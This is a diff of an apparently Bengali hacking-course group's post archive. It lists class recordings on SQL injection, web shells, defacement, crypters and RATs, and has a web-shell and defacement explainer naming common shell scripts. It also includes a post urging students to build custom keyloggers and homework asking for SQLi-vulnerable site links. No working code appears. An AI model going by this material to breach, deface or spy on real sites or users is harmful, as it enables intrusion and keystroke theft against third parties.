+### entry-23 — আসুন দেখে নেই যেভাবে আমরা আমাদের হোমওয়ার্কের জন্য পিডিএফ তৈরি করব!
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1622857422750180)
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-## Messenger Group Notice!!
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-23)
 
-Date: 2026-08-12 · Category: notices · ID: entry-85
-
-Messenger Group Notice!!
-যারা এখনো অব্দি মেসেঞ্জার গ্রুপে যুক্ত হতে পারেননি, তারা নিম্নোক্ত নির্ধারিত ফেসবুক অ্যাকাউন্টে ফ্রেন্ড রিকোয়েস্ট পাঠান এবং ইনবক্সে আপনার ব্যাচের নাম ও ইমেইল ঠিকানা উল্লেখ করে একটি মেসেজ দিন। ছাত্রত্ব যাচাই সম্পন্ন হওয়ার পর অ্যাডমিন সরাসরি আপনাকে মেসেঞ্জার গ্রুপে যুক্ত করে নেবেন।
-Send request here:
-এছাড়া, যাদেরকে ইতিপূর্বে মেসেঞ্জার গ্রুপে যুক্ত করা হয়েছে কিন্তু ইনবক্সে গ্রুপটি খুঁজে পাচ্ছেন না, তারা অনুগ্রহ করে
-Message Requests
-বা
-Spam
-সেকশন একবার যাচাই করে দেখুন। সেখানে আপনার ব্যাচের মেসেঞ্জার গ্রুপটি দেখতে পাবেন।
-আপনাদের সহযোগিতার জন্য ধন্যবাদ।
-
-- [Resource](https://www.facebook.com/qrazam71)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1624053222630600)
-
-## Class 7 — SQLi WAF ও IDS
-
-Date: 2026-08-14 · Category: recordings · ID: entry-88
-
-ক্লাস রেকর্ড
-১৪/০৮/২০২৬
-10Ugar3fjDL1thCWdCkr6cC-Al0k5BjUz
-
-- [Resource](https://drive.google.com/file/d/10Ugar3fjDL1thCWdCkr6cC-Al0k5BjUz/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626381205731135)
-
-## Errorbased SQLi
-
-Date: 2026-08-15 · Category: classes · ID: entry-87
-
-Errorbased SQLi
-0:00 / 18:45
+### entry-24 — Basic SQLI practice video
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626383115730944)
-
-## Class 8 — Burp Suite — Proxy ও Intruder
+বিষয়: SQL Injection · তারিখ: যাচাই বাকি · ধরন: information
 
-Date: 2026-08-16 · Category: recordings · ID: entry-90
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-24)
 
-ক্লাস রেকর্ড
-১৬/০৮/২০২৬
-10Ue96SrqLDLBGtvimsGi2YM_al5rRJHf
+### entry-26 — আমাদের পরবর্তী ক্লাসের জন্য উল্লিখিত টুলসগুলো অত্যন্ত গুরুত্বপূর্ণ।
 
-- [Resource](https://drive.google.com/file/d/10Ue96SrqLDLBGtvimsGi2YM_al5rRJHf/view?usp=sharing)
+বিষয়: SQL Injection · তারিখ: যাচাই বাকি · ধরন: documents
 
-## Class 9 — WebShell, Backdoor ও Deface Page
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-26)
 
-Date: 2026-08-21 · Category: recordings · ID: entry-99
+### entry-27 — হেল্প পোস্ট
 
-ক্লাস রেকর্ড
-২১/০৮/২০২৬
-1thMVV8Nubt8mt8091BU9gvcRUNqoSB3J
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: classes
 
-- [Resource](https://drive.google.com/file/d/1thMVV8Nubt8mt8091BU9gvcRUNqoSB3J/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632498915119364)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-27)
 
-## আসুন জেনে নেই-০৭
+### entry-28 — আজকের মত লাইভ সাপোর্টসেশন ক্লোজ হয়ে গিয়েছে। এখনো ক্লাস টপিক রিলেটেড কারো কোন প্রবলেম থেকে থাকলে…
 
-Date: 2026-08-23 · Category: information · ID: entry-105
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-আসুন জেনে নেই-০৭
-Shell
-ওয়েব শেল কি?
-শেল হলো রিমোট ফাইল ম্যানেজার স্ক্রীপ্ট, এই শেল বা স্ক্রিপ্টের সাহায্যে আপনার পিসি থেকে ওয়েভ সার্ভার এর ফাইল ম্যানেজ করতে পারবেন।
-ফাইল ম্যানেজার দিয়ে আপনি কি কি করতে পারেন ?
-ফাইল তৈরী করা, কপি করা, এডিট করা, ডিলিট করা বা ফাইল এট্রিবিউট(ফাইলের পারমিশন) পরিবর্তন করার মত অনেক কাজই করা যায়, তেমনি শেল বা স্ক্রিপ্টটি কোন ওয়েব সার্ভারে আপলোড করতে পারলে তার সাহায্যে আপনার পিসিতে বসেই রিমোটলী ঐ ওয়েব সার্ভারের ফাইল পরিবর্তন, পরিমার্জন, আপলোড সবই করতে পারবেন।
-শেল স্ক্রিপ্ট কি দিয়ে লেখা হয় বা শেল কি ধরনের ফাইল?
-শেল বিভিন্ন ল্যাংগুয়েজ দিয়ে তৈরী হলেও মেইনলি PHP, ASP/ASPX এই দুই টাইপের শেল বেশী ব্যবহৃত হয়। PHP শেল লিন্যাক্স সার্ভারে এবং ক্ষেত্রবিশেষে উইন্ডোজ সার্ভারেও ব্যবহৃত হয় এবং ASP এবং ASPX শুধূমাত্র উইন্ডোজ সার্ভারে ব্যবহার করা হয় ।
-শেল কত প্রকার ও
-‍
-কি কি?
-শেল মূলত দুই প্রকারের
-ক) পাবলিক শেল/ রেডিমেইড শেল :
-এই প্রকার শেলের সোর্স কোর্ড সবার জন্য উন্মুক্ত থাকে এবং যে কেউ ব্যবহার করতে পারে। Google, github.com, pastebin.com ইত্যাদি ছাড়াও বিভিন্ন সাইটে সার্চ করলেই পেয়ে যাবেন।
-খ) প্রাইভেট শেল / পারসোনাল শেল :
-হ্যাকারসরা নিজেদের চাহিদা অনুযায়ী তৈরী করে নেয়। সাধারনত এই টাইপের শেল গুলো ব্যক্তিগত ভাবে ব্যবহার করে বিধায় সোর্সকোড বাইরে দিতে চায় না।
-শেলের মাধ্যমে কি কি করা যায় বা কি ফাংশন রয়েছে??
-# সাধারনত হ্যাকাররা প্রথমে আপলোডার(খুবই ছোট শেল-শুধু আপলোড অপশন বা তার সাথে ফাইল/ফোল্ডার ) শেল ব্যবহার করে, এর পর এই শেল থেকে ফুল ফাংশনাল (যে যেই টাইপের কাজ করতে ইচ্ছুক সেই টাইপের) শেল আপলোড করার জন্য ব্যাবহার করে।
-# সাইটের ডাটাবেস এক্সেস নেয়ার জন্য
-# সাইটের সোর্স কোড দেখার জন্য বা পরিবর্তন –পরিমার্জন করার জন্য।
-# সাইটের সার্ভার থেকে ফুল সার্ভারে এক্সেস নেয়ার জন্য।
-# সার্ভারে থাকা অন্যান্ন সাইট এক্সস নেয়ার জন্য।
-# সাইট ডিফেস করার জন্য।
-কমন কিছু শেল এর পরিচিতিঃ
-আপলোডার শেলঃ
-কিছু শেল
-‍
-স্ক্রীপ্ট আছে যা দিয়ে শুধু মাত্র ফাইল আপলোড করা যায় এর বাইরে আর কোন ফাংশন নেই, এই টাইপের শেল গুলোই আপলোডার শেল। এর ফাইল সাইজ ও স্বাভাবিক ভাবেই খুব ছোট হয়।
-যে কোন সাইটে প্রথমে আপলোডার শেল দিয়ে ট্রাই করা ভালো। কারন অনেকক্ষেত্রে সাইটের ফাইল আপলোডের জন্য ফাইল সাইজ লিমিটেশন দেয়া থাকে আবার অনেক সাইটে কিছু
-‍
-কিছু ফাংশন(যেমন সার্ভার ইনফরমেশন দেখার বা ফাইল ডিরেক্টরী দেখার কমান্ডগুলো, ইত্যাদি) রেষ্ট্রিকশন দেয়া থাকে।
-পূর্বেই আপনাদের গ্রুপে সিম্পল আপলোডার শেল সহ বেশ কিছু অ্যাডভান্স শেল দেওয়া হয়েছে: https://www.facebook.com/share/p/Aed411AX1r1rV8rw/
-তবে অনেক হ্যাকার কিছু মডিফাইড আপলোডার শেল ব্যবহার করে থাকেন, যেমন ফুয়াদ ভাই (.... .. -.. -.. . -. / -- . -- -... . .-.) আপলোডার শেল হিসাবে tcup.php নামক একটি শেল ব্যবহার করে।
-মিনি শেলঃ
-আপলোড আপশন সহ ফাইল ম্যানেজার টাইপের যে সকল
-‍
-স্ক্রিপ্ট আছে বা তৈরী করা হয় সেগুলো সাধারনত মিনি শেল হিসাবে পরিচিত, এই টাইপের শেলে এডভান্স যেমন মাস
-‍
-ডিফেইস, ব্যাক ডোর কানেক্ট, সীমলিংক, ডাটাবেইস এডিট বা ডাম্পার ইত্যাদি ফাংশনগুলো থাকে না ।
-যেমনঃ moon.php mini.php ইত্যাদি।
-এডভান্স শেলঃ
-সার্ভারে এডভান্স বা স্পেসিফিক কাজের জন্য যে শেল গুলো তৈরী করা হয় বা ব্যবহার করা হয় যেমনঃ এস কিউএল ম্যানেজার(ডাটাবেস থেকে ইউজজার নেম পাসওয়ার্ড দেখা বা মডিফাই করা, আন্যান্ন ডাটা দেখা বা মডিফাই করা…ইত্যাদি), ব্যাক ডোর কানেক্ট, সিম লিংক, মাস ডিফেস, পোর্ট স্কেন, মীরর ইত্যাদি গুলো এডভান্স শেল হিসাবে পরিচিত।
-wso.php , afla.php, 479.php, 404.php, r57.php, c99.php ইত্যাদি, এগুলো প্রায় একই টাইপের কমন ফাংশনাল শেল। এগুলোই আবার ফুল ফাংশনাল শেল নামেও পরিচিত, কেননা- এই সব শেলের মাধ্যমে কমন প্রায় সব কাজই করা যায়।
-আবার স্পেসিপিক কাজের জন্য কিছু শেল, যেমনঃ
-tmass.php – মাস ডিফেইস স্ক্রিপ্ট ( এটা ফুয়াদের মডিফাই করা শেল)
-symlink.php বা sym.php – সিমলিংক এর জন্য স্ক্রিপ্ট।
-adminer.php – ডাটাবেইস কানেক্ট, ডাটা এডিট, মডিফিকেশন এর জন্য স্ক্রিপ্ট
-domain.php – সার্ভারের ডোমেইন লিষ্ট(মানে ঔ সার্ভারে আর কি কি ওয়েভ সাইট আছে) দেখার জন্য স্ক্রিপ্ট।
-প্রাইভেট শেলঃ
-আগেই বলেছি বিভিন্ন প্রফেশনাল হ্যাকার (মেইনলী যারা শুধু হ্যাকিং ই করে থাকেন বা হ্যাকার গ্রুপের সাথে কাজ করেন) বা বিভিন্ন হ্যাকার গ্রুপ তাদের নিজের প্রয়োজনে নিজের মতো করে কিছু শেল তৈরী করেন সেগুলোই হলো প্রাইভেট শেল। এই টাইপের শেল গুলো গ্রুপের বাইরে প্রকাশ করেন না, তাই সেগুলো ওপেন প্লেসে পাওয়া যায় না।
-Defacement
-ডিফেস কি?
-ডিফেস এর অনেক মানে আছে তবে ওয়েব হ্যাকিং এ ডিফেস বলতে বোঝায় সাইট এর এডমিন অথবা অন্য কোনো ভাবে এক্সেস করে নিজের পদচিহ্ন বা স্থান জানান দেওয়া। মূলত সাইটের কোনো কনটেন্টের পরিবর্তন কিংবা কোনো কনটেন্টের পরিবর্তে নিজের কোনো কনটেন্ট দেখানোর মাধ্যম কে বোঝায়। আরো সহজ ভাবে বলতে গেলে:
-ডিফেইস এর শাব্দিক অর্থ বিকৃত। হ্যাকিংয়ের ক্ষেত্রেও এর অর্থ অনেকটা সেরকম। কোনো সাইট হ্যাক হয়ে যাওয়ার একটি প্রমাণ হলো ডিফেইস।ওয়েবসাইট ডিফেইসমেন্ট বা ডিফেইস হলো এমন একধরনের আক্রমনাত্মক প্রদর্শন পদ্ধতি যার ফলে কোনো ওয়েবসাইটের আসল ওয়েবপেইজটি হ্যাকার তার নিজস্ব ওয়েবপেইজ দ্বারা প্রতিস্থাপিত করে।আমরা প্রায় দেখে থাকি হ্যাকাররা কোনো সাইট হ্যাক করে ওই সাইটের ওয়েবপেইজে প্রদর্শন করে Hacked by CYBER-71 ! এই প্রক্রিয়াটিই হলো ডিফেইস।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-28)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632441241791798)
+### entry-30 — Extra remote support session
 
-## Class 10 — File Upload Vulnerabilities
+বিষয়: Session & Redirect · তারিখ: যাচাই বাকি · ধরন: information
 
-Date: 2026-08-23 · Category: recordings · ID: entry-107
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-30)
 
-ক্লাস রেকর্ড
-২৩/০৮/২০২৬
-1MndRtXOopfUT7SjY5B6QX6VEjxxrQLGZ
+### entry-31 — শুধুমাত্র Mac ডিভাইস এর জন্য
 
-- [Resource](https://drive.google.com/file/d/1MndRtXOopfUT7SjY5B6QX6VEjxxrQLGZ/view?usp=sharing)
+বিষয়: SQL Injection · তারিখ: যাচাই বাকি · ধরন: documents
 
-## Class 11 — PortSwigger Labs — SQLi, XSS ও File Upload
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-31)
 
-Date: 2026-08-29 · Category: recordings · ID: entry-115
+### entry-32 — হোমওয়ার্ক আপডেট:
 
-ক্লাস রেকর্ড
-২৯/০৮/২০২৬
-1wTdg47l6M8J9y4Lmzi6GHyaZMP-0zbKp
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-- [Resource](https://drive.google.com/file/d/1wTdg47l6M8J9y4Lmzi6GHyaZMP-0zbKp/view?usp=sharing)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-32)
 
-## Class 12 — Acunetix — Scanner Setup ও Reports
+### entry-33 — শুধুমাত্র ম্যাকবুকে টুলস সেটআপ সংক্রান্ত সাপোর্ট পোস্টে
 
-Date: 2026-08-30 · Category: recordings · ID: entry-112
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস রেকর্ড
-৩০/০৮/২০২৬
-1YUQJTOVvRJ6-8UwINj71Jo5pZVq21FGp
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-33)
 
-- [Resource](https://drive.google.com/file/d/1YUQJTOVvRJ6-8UwINj71Jo5pZVq21FGp/view?usp=sharing)
+### entry-34 — এখনো অব্দি যারা
 
-## Class 13 — Batch Scripting
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: tools
 
-Date: 2026-09-04 · Category: recordings · ID: entry-117
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-34)
 
-ক্লাস রেকর্ড
-০৪/০৯/২০২৬
-10Ut65sMkUshm54yw4KjbputZMWY6uCfJ
+### entry-35 — আজকে রাত ৯ টা ৩০ থেকে কিন্তু আপনাদের প্রথম ক্লাস, মনে আছে?
 
-- [Resource](https://drive.google.com/file/d/10Ut65sMkUshm54yw4KjbputZMWY6uCfJ/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1644380957264493)
+বিষয়: Orientation · তারিখ: যাচাই বাকি · ধরন: tools
 
-## Class 14 — Linux Installation ও Virtual Lab Setup
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-35)
 
-Date: 2026-09-06 · Category: recordings · ID: entry-122
+### entry-36 — Extra support session will start from 6:00 PM
 
-ক্লাস রেকর্ড
-০৬/০৯/২০২৬
-1fXShf8eUl6Z-eCutvA7GHaS1BcygWDnQ
+বিষয়: Session & Redirect · তারিখ: যাচাই বাকি · ধরন: tools
 
-- [Resource](https://drive.google.com/file/d/1fXShf8eUl6Z-eCutvA7GHaS1BcygWDnQ/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1646127127089876)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-36)
 
-## Linux Installation & Virtual Lab Setup
+### entry-37 — Join for Havij tools related support
 
-Date: 2026-09-07 · Category: tools · ID: entry-121
+বিষয়: SQL Injection · তারিখ: যাচাই বাকি · ধরন: tools
 
-Linux Installation & Virtual Lab Setup
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-37)
 
-- [Resource](https://drive.google.com/file/d/1tMKC4u2W4LwNXZXlRX93wMH5M7TWBHYT/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1646665390369383)
+### entry-38 — ধন্যবাদ সবাইকে, ইন্টারনেট নিয়ে কয়েকজন struggle করলেও খুবই enjoyable একটা সেশন ছিলো আপনাদের সাথে।
 
-## Class 15 — Linux Command Line
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-Date: 2026-09-11 · Category: recordings · ID: entry-124
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-38)
 
-ক্লাস রেকর্ড
-১১/০৯/২০২৬
-1kbSCvxBTMEWRX4wBrjlA0ah2Zw74Fgc8
+### entry-41 — Submit 3 SQLi site link with screenshot...
 
-- [Resource](https://drive.google.com/file/d/1kbSCvxBTMEWRX4wBrjlA0ah2Zw74Fgc8/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1650729253296330)
+বিষয়: SQL Injection · তারিখ: 2026-07-24 · ধরন: documents
 
-## Class 16 — Crypter, Antivirus ও RAT Lab
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-41)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/entry-41.txt)
 
-Date: 2026-09-13 · Category: recordings · ID: entry-126
+### entry-42 — চলুন কম্পিউটার নিয়ে একটু জেনে আসি!!
 
-ক্লাস রেকর্ড
-১৩/০৯/২০২৬
-1x3o6Wk_0OsOq3Mf2d_2xZeSlppM7cvbT
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-- [Resource](https://drive.google.com/file/d/1x3o6Wk_0OsOq3Mf2d_2xZeSlppM7cvbT/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1652121839823738)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-42)
 
-## INFORMATIONAL POST-04
+### entry-43 — OSINT — নিরাপদ সম্পাদিত ক্লাস নোট
 
-Date: 2026-09-16 · Category: information · ID: entry-2
+বিষয়: OSINT · তারিখ: 2026-07-26 · ধরন: documents
 
-INFORMATIONAL POST-04
-আমাদের গত ক্লাসে
-Keylogger, Spyware & RAT (Live/Practical)
-নিয়ে বিস্তারিত আলোচনা এবং প্র্যাকটিক্যাল ডেমো দেখানো হয়েছে। পোস্টের শুরুতেই জানিয়ে রাখি, এই ক্লাসটি সম্পূর্ণ শিক্ষার উদ্দেশ্যে (Educational/Learning Purpose) নেওয়া হয়েছিল।
-অনেকেই হয়তো ক্লাসের পর ডিরেক্ট টুলস আশা করেছিলেন, কিন্তু সিকিউরিটি ও এথিক্যাল লার্নিংয়ের খাতিরে সরাসরি কোনো টুলস প্রোভাইড করা হয়নি। তবে আপনাদের গবেষণার জন্য একটি
-Research PDF
-শেয়ার করা হয়েছে। ওই পিডিএফটি নিয়ে যদি আপনারা গভীর অ্যানালাইসিস ও রিসার্চ করেন, তাহলে নিজেরাই RAT টুলস এর মূল মেকানিজম বুঝতে পারবেন এবং টুলস অব্দি পৌঁছাতে পারবেন। আর একজন রিয়েল সিকিউরিটি রিসার্চার হওয়ার জন্য নিজে থেকে রিসার্চ করে বের করার (Self Research) এই দক্ষতাটি তৈরি হওয়া অত্যন্ত প্রয়োজনীয়।
-তাছাড়া, আপনাদের হ্যান্ডস অন লার্নিংকে আরেক ধাপ এগিয়ে নিতে আমি একটি পেইড কিলগার
-রিসোর্স শেয়ার করছি। আপনারা জানেন, কী-লগিংয়ের মাধ্যমে মূলত সিস্টেমের প্রতিটি কীস্ট্রোক রেকর্ড করা হয়। এই পেইড রিসোর্সটি ভালোভাবে অ্যানালাইসিস করলে আপনারা বুঝতে পারবেন একটি Keylogger কীভাবে ব্যাকগ্রাউন্ডে কাজ করে এবং কীভাবে আপনারা নিজেদের কাস্টম Keylogger Tool তৈরি করতে পারবেন।
-1nhlO07TA1i9lbmeLFVVqCyrYOHZonhao
-আজকের করণীয়:
-১. শেয়ার করা PDF টি নিয়ে রিসার্চ শুরু করে দিন। ২. পেইড রিসোর্সটি অ্যানালাইসিস করে কাস্টম কী-লগার বিল্ড করার মেকানিজমটি বুঝুন।
-রিসোর্সগুলো দিয়ে প্র্যাকটিস করার সময় কোনো জায়গায় বুঝতে অসুবিধা হলে অবশ্যই কমেন্টে জানাবেন, উত্তর দেওয়ার চেষ্টা করবো।
-ধন্যবাদ!
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-43)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/entry-43.txt)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1654330032936252)
+প্রকাশিত পাঠ: lab-scoped-redacted
 
-## Class 17 — LFI ও Web Server Security Lab
+### entry-44 — সবাই ক্লাসে চলে আসুন।
 
-Date: 2026-09-18 · Category: recordings · ID: entry-132
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-ক্লাস রেকর্ড
-১৮/০৯/২০২৬
-1EqmHoZaM6FRFG66-eSE70LODAIp30FS0
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-44)
 
-- [Resource](https://drive.google.com/file/d/1EqmHoZaM6FRFG66-eSE70LODAIp30FS0/view?usp=sharing)
+### entry-45 — OSINT - B66 Delta
 
-## LFI/LFD Basics
+বিষয়: OSINT · তারিখ: যাচাই বাকি · ধরন: information
 
-Date: 2026-09-19 · Category: classes · ID: entry-130
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-45)
 
-LFI/LFD Basics
-0:00 / 16:36
+### entry-48 — কি এক্ট্যা অবস্থা !!!
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1656477746054814)
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-## Class 18 — Kali Tools Setup — Java, Go ও Burp Suite
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-48)
 
-Date: 2026-09-20 · Category: recordings · ID: entry-134
+### entry-50 — Extra support session will start from 7:00 PM
 
-ক্লাস রেকর্ড
-২০/০৯/২০২৬
-1h3MPDfRtZKwHY3sBVOSQ80Nb7uArNINe
+বিষয়: Session & Redirect · তারিখ: যাচাই বাকি · ধরন: tools
 
-- [Resource](https://drive.google.com/file/d/1h3MPDfRtZKwHY3sBVOSQ80Nb7uArNINe/view?usp=sharing)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-50)
 
-## Class 19 — Advanced LFI, Path Traversal ও RCE Lab
+### entry-51 — CyberFox for Mac.txt
 
-Date: 2026-09-25 · Category: recordings · ID: entry-142
+বিষয়: Session & Redirect · তারিখ: 2026-07-31 · ধরন: information
 
-ক্লাস রেকর্ড
-২৫/০৯/২০২৬
-1DsJbH8zzxN5aC8YI7CXCiVC_3wKmsodt
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-51)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/cyberfox-for-mac.txt)
 
-- [Resource](https://drive.google.com/file/d/1DsJbH8zzxN5aC8YI7CXCiVC_3wKmsodt/view?usp=sharing)
+### entry-52 — Arena private Campus directory
 
-## Class 20 — WordPress, phpMyAdmin ও Elementor
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-Date: 2026-09-27 · Category: recordings · ID: entry-145
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-52)
 
-ক্লাস রেকর্ড
-২৭/০৯/২০২৬
-1WT64w91wmge9FczUis8I-ZRVXgR2cT3c
+### entry-53 — সবাই ক্লাসে চলে আসুন।
 
-- [Resource](https://drive.google.com/file/d/1WT64w91wmge9FczUis8I-ZRVXgR2cT3c/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1664560601913195)
+বিষয়: Session & Redirect · তারিখ: যাচাই বাকি · ধরন: information
 
-## Class 21 — Recon — VPS ও Shodan Setup
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-53)
 
-Date: 2026-10-02 · Category: recordings · ID: entry-147
+### entry-54 — Session hijacking / Blocking, Mid Exam prep
 
-ক্লাস রেকর্ড
-০২/১০/২০২৬
-1FWVj_OVTEqqlDnYHV35e-1krbMS_RXGj
+বিষয়: Session & Redirect · তারিখ: যাচাই বাকি · ধরন: information
 
-- [class-2026-10-02.mp4](https://drive.google.com/file/d/1QtIQkLLqMQbIQWksRcWVzYcJ-9pKymBu/view)
-- [Resource](https://drive.google.com/file/d/1FWVj_OVTEqqlDnYHV35e-1krbMS_RXGj/view?usp=sharing)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-54)
 
-## Topic: Malware Removal Live Project (Part 1)
+### entry-55 — গুরুত্বপূর্ণ নোটিশঃ দ্বিতীয় ইন্সটলমেন্ট সংক্রান্ত পোস্ট, ১০% জরিমানা এবং সাসপেনশন এড়াতে ২য় ইন্সটল…
 
-Date: unverified · Category: information · ID: entry-1
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: notices
 
-Topic: Malware Removal Live Project (Part 1)
-Class link :
-Class topic will start 9:45 PM
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-55)
 
+### entry-56 — Gift for AWS Batch 66 Delta
 
-## আসসালামু আলাইকুম। কেমন আছেন সবাই?
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: documents
 
-Date: unverified · Category: information · ID: entry-17
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-56)
 
-আসসালামু আলাইকুম। কেমন আছেন সবাই?
-আমি তানজিম আল ফাহিম, আপনাদের কোর্সের প্রধান প্রশিক্ষক হিসেবে দায়িত্ব পালন করবো ইনশাআল্লাহ। আমি ছাড়াও ২১ জনের অভিজ্ঞ একটি টীম এবং সম্মানিত বিশেষজ্ঞ এবং দেশসেরা প্রশিক্ষকবৃন্দরা আপনাদের কোর্সের সাথে পুরো সময়কাল ধরেই থাকবেন।
+### entry-57 — যাদের cyberfox রিলেটেড ইস্যু আছে তারা এই লিংকে জয়েন করুন
 
-আপনাদের অরিয়েন্টেশন ক্লাস শুরু হবে রবিবার রাত ০৯ঃ৩০ মিনিটে।
-প্রথম অরিয়েন্টেশন ক্লাস হিসেবে সবাই অন্তত ১০ মিনিট পুর্বেই গ্রুপে উপস্থিত থাকবেন। সার্ভারে লগিন করে নিন, এ সংক্রান্ত কোন সমস্যা থাকলে পাসওয়ার্ড রিসেট অপশন থেকে পাসওয়ার্ড রিসেট করে নিন অথবা গ্রুপ থেকে সহায়তা চেয়ে নিন।
+বিষয়: Session & Redirect · তারিখ: যাচাই বাকি · ধরন: information
 
-ক্লাসঃ অরিয়েন্টেশন এবং প্রথম দিকের ক্লাস গুলো এই গ্রুপে লাইভ, এবং সার্ভারেও পরিচালনা করা হয়ে থাকবে। ক্লাস প্লাটফর্ম হিসেবে, গ্রুপ - গুগল মিট, গুগল ক্লাস রুম এবং সার্ভার ব্যাবহার হয়ে থাকে।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-57)
 
-তবে কোর্সের একেবারে প্রথমেই সবাই সবার সাথে পরিচিত হয়ে নিতে ভূলবেন না। কমেন্টে আপনার নাম, কোথায় থাকেন, শিক্ষা প্রতিষ্ঠান কিংবা কর্মস্থলের পরিচয় দিয়ে কমেন্ট করে জানাতে ভূলবেন না। যেহেতু পুরো কোর্স জুড়ে একসাথেই কাজ করা হবে তাই ক্লাসের আগেই পরিচিত হয়ে নেই আপনার সাথে।
+### entry-59 — CYBER-71 private exploit tools
 
-ক্লাসে দেখা হচ্ছে ইনশাআল্লাহ। ধন্যবাদ।
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: tools
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1601890488180207)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-59)
 
-## আর এক ঘন্টা পরেই
+### entry-60 — VIDEO FOR NO-REDIRECT
 
-Date: unverified · Category: information · ID: entry-18
+বিষয়: Session & Redirect · তারিখ: যাচাই বাকি · ধরন: classes
 
-আর এক ঘন্টা পরেই
-রাত ৯ টা ৩০ মিনিটে অরিয়েন্টেশন ক্লাস, মনে আছে তো?
-অরিয়েন্টেশন ক্লাস লিংক সরাসরি গ্রুপেই শেয়ার করা হবে। এখানেই সমস্ত দিক নির্দেশনা প্রদান করা হবে। সুতরাং, নির্ধারিত সময়ের ১০ মিনিট আগে শুধুমাত্র গ্রুপে চলে আসবেন।
-ক্লাসে দেখা হচ্ছে ইনশাআল্লাহ।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-60)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604060137963242)
+### entry-61 — Manual SQL Injection
 
